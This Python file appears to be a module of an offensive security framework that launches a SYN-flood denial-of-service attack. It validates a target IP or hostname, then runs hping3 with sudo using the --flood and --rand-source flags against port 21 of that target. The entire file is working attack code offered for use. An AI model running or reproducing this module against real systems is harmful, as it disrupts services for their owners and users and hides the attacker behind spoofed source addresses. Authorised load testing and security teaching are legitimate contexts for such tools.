"""Denial-of-Service Module
- Module that sends a succession of SYN requests to the target system
  to make the system unresponsive to legitimate traffic
"""

import platform

from utils.font_styles import error_message, info_message, success_message
from utils.secure_utils import (
    get_privilege_prefix,
    run_user_command,
    validate_hostname,
    validate_ip_address,
)

from .base import BaseModule


class DoS(BaseModule):
    """DoS module for executing Denial-of-Service attacks."""

    def __init__(self):
        self.name = "dos"
        self.full_name = "DoS"
        self.description = "Denial-of-Service attack"
        self.options = "TARGET"
        self.requires_target = True
        self.target = None

    def run(self, target=None):
        """Execute DoS attack on target."""
        if target is None:
            error_message("Target required for DoS attack")
            return

        self.target = target

        if not self._validate_target():
            return

        self._execute_core_logic()

    def main(self):
        """Interactive prompt mode."""
        self._show_module_header()
        self.target = self._get_input("Target IP or hostname")

        if not self._validate_target():
            self._prompt_continue()
            return

        self._execute_core_logic()
        self._prompt_continue()

    def _validate_target(self, target=None):
        """Validate target IP or hostname."""
        target = target or self.target
        if target is None:
            error_message("No target specified")
            return False
        if not (validate_ip_address(str(target)) or validate_hostname(str(target))):
            error_message(f'Invalid target "{target}"')
            return False
        return True

    def _execute_core_logic(self):
        """Execute the DoS attack."""
        if platform.system() == "Windows":
            error_message(
                "The DoS module relies on hping3, which is not available on Windows. "
                "This module only works on Linux and macOS."
            )
            return

        info_message(f"Running DoS attack on {self.target}")
        info_message(
            "Running a DoS attack properly requires the command to be run using sudo"
        )
        print()

        cmd_args = get_privilege_prefix() + [
            "hping3",
            "-c",
            "10000",
            "-d",
            "120",
            "-S",
            "-w",
            "64",
            "-p",
            "21",
            "--flood",
            "--rand-source",
            str(self.target),
        ]

        try:
            run_user_command(
                cmd_args, timeout=600, use_shell=False, capture_output=False
            )
        except Exception as e:
            error_message(f"DoS attack failed: {e}")
            return

        print()
        success_message(f"Finished attacking {self.target}")
